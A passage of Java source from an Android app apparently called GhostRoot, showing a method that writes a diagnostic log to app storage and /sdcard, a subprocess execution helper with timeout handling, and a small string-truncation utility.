    private static final int C_OK      = 0xFF4CAF50;
    private static final int C_FAIL    = 0xFFF44336;

    /**
     * 注：v28 起删除了「复制日志」按钮（copyLogToClipboard）。
     *     日志区 TextView 自带 android:textIsSelectable="true"，
     *     用户长按即可选中 / 复制任意片段，比整段复制的按钮更好用。
     */
    /** Always write to app-private dir; also try /sdcard for easy pickup. */
    private void saveLogToFile() {
        try {
            String body = "GhostRoot log\nmodel=" + Build.MODEL + "\nfp=" + Build.FINGERPRINT + "\n" + fullLog.toString();
            File priv = new File(getFilesDir(), "ghostroot_log.txt");
            FileOutputStream f1 = new FileOutputStream(priv, false);
            f1.write(body.getBytes()); f1.flush(); f1.close();
            String pubPath = "/sdcard/GhostRoot_log.txt";
            try {
                FileOutputStream f2 = new FileOutputStream(pubPath, false);
                f2.write(body.getBytes()); f2.flush(); f2.close();
            } catch (Throwable t) { pubPath = priv.getAbsolutePath() + " (sdcard failed)"; }
            final String shown = pubPath;
            ui.post(new Runnable() {
                @Override public void run() {
                    Toast.makeText(MainActivity.this, "日志已存: " + shown, Toast.LENGTH_LONG).show();
                }
            });
        } catch (Throwable t) {
            // ignore
        }
    }
    /* ============================ exec helper ============================ */

    private String execCapture(String[] argv, long timeoutMs) {
        Process p = null;
        try {
            p = new ProcessBuilder(argv).redirectErrorStream(true).start();
            final Process fp = p;
            final StringBuilder sb = new StringBuilder();
            Thread rd = new Thread(new Runnable() {
                @Override public void run() {
                    try {
                        BufferedReader br = new BufferedReader(new InputStreamReader(fp.getInputStream()));
                        String line;
                        while ((line = br.readLine()) != null) sb.append(line).append("\n");
                    } catch (Throwable ignored) {}
                }
            });
            rd.setDaemon(true);
            rd.start();
            boolean done = p.waitFor(timeoutMs, TimeUnit.MILLISECONDS);
            if (!done) {
                p.destroy();
                p.waitFor(2, TimeUnit.SECONDS);
                p.destroyForcibly();
            }
            rd.join(1500);
            return sb.toString();
        } catch (Throwable t) {
            return "[exec error] " + t;
        } finally {
            if (p != null) { try { p.getInputStream().close(); } catch (Throwable ignored) {} }
        }
    }

    private static String tailOf(String s) {
        if (s == null) return "";
        int n = s.length();
        return " | " + (n > 600 ? s.substring(n - 600) : s).replace("\n", " ");
    }

}